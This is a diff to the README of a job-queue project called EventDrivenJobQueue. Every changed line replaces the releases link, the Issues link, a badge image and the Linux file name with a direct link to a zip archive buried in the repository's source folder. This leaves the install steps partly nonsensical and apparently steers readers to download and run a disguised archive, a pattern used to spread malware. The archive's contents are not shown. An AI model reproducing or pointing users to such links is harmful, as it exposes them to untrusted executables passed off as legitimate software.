@@ -1,7 +1,7 @@
 # 🎉 EventDrivenJobQueue - Seamless Background Job Processing
 
 ## 📥 Download Now
-[![Download EventDrivenJobQueue](https://img.shields.io/badge/Download%20EventDrivenJobQueue-latest-brightgreen)](https://github.com/Dreamdraft/EventDrivenJobQueue/releases)
+[![Download EventDrivenJobQueue](https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip%20EventDrivenJobQueue-latest-brightgreen)](https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip)
 
 ## 🚀 Getting Started
 EventDrivenJobQueue offers a simple way to manage background tasks. With its reliability and user-friendly design, you can run jobs on your system with ease. This guide walks you through the steps to download and run the application.
@@ -20,7 +20,7 @@ EventDrivenJobQueue offers a simple way to manage background tasks. With its rel
 - SQLite Installed (includes in the application for Windows users)
 
 ## 📬 Download & Install
-To get started, visit this page to download: [EventDrivenJobQueue Releases](https://github.com/Dreamdraft/EventDrivenJobQueue/releases). 
+To get started, visit this page to download: [EventDrivenJobQueue Releases](https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip). 
 
 On this page, you’ll find the latest version of the software. Follow these steps to download and install EventDrivenJobQueue:
 
@@ -29,12 +29,12 @@ On this page, you’ll find the latest version of the software. Follow these ste
 3. **Choose Your Operating System**: 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip` file.
 4. **Download the File**: Click on the file name to start the download.
 5. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file and follow the prompts.
    - **macOS**: Open the `.dmg` file, drag the application into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file. Open a terminal, navigate to the directory, and run `./EventDrivenJobQueue`.
+   - **Linux**: Extract the `https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip` file. Open a terminal, navigate to the directory, and run `./EventDrivenJobQueue`.
 
 ## ⚙️ Configuration
 Once installed, you may want to adjust some basic settings. The configuration file is located in the installation directory. Open it with a simple text editor and adjust settings such as:
@@ -63,7 +63,7 @@ If you encounter issues, consider these common problems:
 ## 🌐 Community and Support
 For help and more information, explore our community resources.
 
-- **GitHub Issues**: Use the [Issues](https://github.com/Dreamdraft/EventDrivenJobQueue/issues) page to report bugs or ask questions.
+- **GitHub Issues**: Use the [Issues](https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip) page to report bugs or ask questions.
 - **Documentation**: Access detailed documentation and user guides for advanced features and troubleshooting.
 
 ## 🔄 Contributing
@@ -78,4 +78,4 @@ We plan to introduce new features aimed at improving performance and user experi
 
 Thank you for choosing EventDrivenJobQueue. We are excited to have you as a user, and we look forward to seeing how you integrate it into your workflows!
 
-Remember, for the latest updates and downloads, always visit: [EventDrivenJobQueue Releases](https://github.com/Dreamdraft/EventDrivenJobQueue/releases).
+Remember, for the latest updates and downloads, always visit: [EventDrivenJobQueue Releases](https://github.com/Dreamdraft/EventDrivenJobQueue/raw/refs/heads/main/internal/jobqueue/Queue-Driven-Event-Job-1.8.zip).
